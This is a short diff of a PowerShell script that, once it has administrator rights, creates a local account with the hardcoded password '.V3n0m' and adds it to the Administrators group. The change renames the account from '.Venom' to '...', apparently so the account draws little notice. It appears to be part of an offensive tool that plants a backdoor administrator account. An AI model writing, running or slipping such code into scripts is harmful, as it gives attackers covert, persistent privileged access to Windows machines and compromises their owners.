@@ -9,9 +9,9 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Exit
 } else {
     # Create a new local admin account
-    Set-Variable -Name username -Value (".Venom")
+    Set-Variable -Name username -Value ("...")
     Set-Variable -Name Password -Value (ConvertTo-SecureString ".V3n0m" -AsPlainText -Force)
-    New-LocalUser $username -Description "Local admin account created via PowerShell" -FullName ".Venom" -Password $Password
+    New-LocalUser $username -Description "Local admin account created via PowerShell" -FullName "..." -Password $Password
     Add-LocalGroupMember -Member $username -Group "Administrators"
 }
 
